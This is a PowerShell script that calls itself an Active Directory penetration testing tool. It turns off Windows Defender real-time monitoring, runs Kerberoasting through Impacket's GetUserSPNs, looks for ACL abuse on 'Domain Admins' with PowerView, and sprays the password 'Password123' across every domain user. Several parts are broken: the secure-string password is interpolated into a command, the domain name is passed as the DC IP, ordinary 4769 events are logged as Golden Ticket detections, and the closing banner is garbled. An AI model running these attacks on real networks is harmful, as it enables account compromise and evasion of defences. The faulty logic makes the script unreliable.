# Configuration for logging
$logFile = "admaster.log"

function Log-Activity {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "$timestamp - $message"
    Add-Content -Path $logFile -Value $logMessage
    Write-Host "[LOG] $message" -ForegroundColor Yellow
}

# Display a banner
function Show-Banner {
    Write-Host @"
    _    ____    _      ___     _______ _   _
   / \  |  _ \  | |/ /   / \ \   / / ____| | | |
  / _ \ | | | | | ' /   / _ \ \ / /|  _| | |_| |
 / ___ \| |_| | | . \  / ___ \ V / | |___|  _  |
/_/   \_\____/  |_|\_\/_/   \_\_/  |_____|_| |_|
                                                 "
@ -ForegroundColor Green
    Write-Host "ADKAVEH - Active Directory Management and Penetration Testing Tool" -ForegroundColor Blue
}

# Temporarily disable Windows Defender
function Disable-WindowsDefender {
    Log-Activity "Disabling Windows Defender temporarily..."
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Log-Activity "Windows Defender has been temporarily disabled."
    } catch {
        Log-Activity "Failed to disable Windows Defender: $_"
    }
}

# Collect Kerberoasting information
function Invoke-KerberoastingScan {
    param (
        [string]$domainName,
        [string]$username,
        [string]$password
    )
    Log-Activity "Starting Kerberoasting scan..."
    try {
        # Use Impacket for Kerberoasting
        # Ensure Impacket is installed and configured
        $impacketPath = "C:\Path\To\Impacket\GetUserSPNs.py"
        if (Test-Path $impacketPath) {
            $command = "python $impacketPath -request -dc-ip $domainName $domainName/$username:$password"
            Invoke-Expression $command
            Log-Activity "Kerberoasting scan completed."
        } else {
            Log-Activity "Impacket not found. Please install Impacket first."
        }
    } catch {
        Log-Activity "Kerberoasting scan failed: $_"
    }
}

# Check ACL (Access Control List) for abuses
function Invoke-ACLAbuseScan {
    Log-Activity "Starting ACL Abuse scan..."
    try {
        # Ensure PowerView is loaded
        if (Get-Module -ListAvailable -Name PowerView) {
            Import-Module PowerView
            Get-DomainObjectAcl -Identity 'Domain Admins' | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' }
            Log-Activity "ACL Abuse scan completed."
        } else {
            Log-Activity "PowerView module not found. Please install PowerView first."
        }
    } catch {
        Log-Activity "ACL Abuse scan failed: $_"
    }
}

# Password Spraying Attack
function Invoke-PasswordSprayingAttack {
    Log-Activity "Starting Password Spraying attack..."
    try {
        # List of users
        $users = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
        # Test password
        $testPassword = "Password123"
        foreach ($user in $users) {
            Log-Activity "Trying password for user: $user"
            $securePassword = ConvertTo-SecureString $testPassword -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential($user, $securePassword)
            Invoke-Command -ComputerName $env:COMPUTERNAME -Credential $credential -ScriptBlock { whoami }
        }
    } catch {
        Log-Activity "Password Spraying attack failed: $_"
    }
}

# Detect Golden Ticket
function Invoke-GoldenTicketDetection {
    Log-Activity "Starting Golden Ticket detection..."
    try {
        # Check security events related to Kerberos
        $events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} -MaxEvents 10
        if ($events) {
            $events | ForEach-Object { Log-Activity "Golden Ticket detected: $($_.Message)" }
        } else {
            Log-Activity "No Golden Ticket events found."
        }
    } catch {
        Log-Activity "Golden Ticket detection failed: $_"
    }
}

# Main script execution
Show-Banner

# Get domain information
$domainName = Read-Host "Enter the domain name"
$username = Read-Host "Enter the username"
$password = Read-Host "Enter the password" -AsSecureString

try {
    # Temporarily disable Windows Defender
    Disable-WindowsDefender

    # Gather generic AD info
    Log-Activity "Gathering generic AD info..."
    Write-Host "Domain Name: $env:USERDOMAIN"
    Write-Host "DNS Domain Name: $env:USERDNSDOMAIN"
    Write-Host "Logon Server: $env:LOGONSERVER"
    Write-Host "DNS Host Name: $(hostname)"
    Write-Host "Computer Name: $(hostname)"

    # Run advanced scans
    Invoke-KerberoastingScan -domainName $domainName -username $username -password $password
    Invoke-ACLAbuseScan
    Invoke-PasswordSprayingAttack
    Invoke-GoldenTicketDetection

} catch {
    Log-Activity "An error occurred: $_"
}

# Final banner
Write-Host @"
                                                                         _  _   _      ___     _______ _   _
 _|  |_| |/ /   / \ \   / / ____| | | |
|_  ..  _| ' /   / _ \ \ / /|  _| | |_| |
|_      _| . \  / ___ \ V / | |___|  _  |
  |__| |_|\_\/_/   \_\_/  |_____|_| |_|
                                          "
@ -ForegroundColor Green
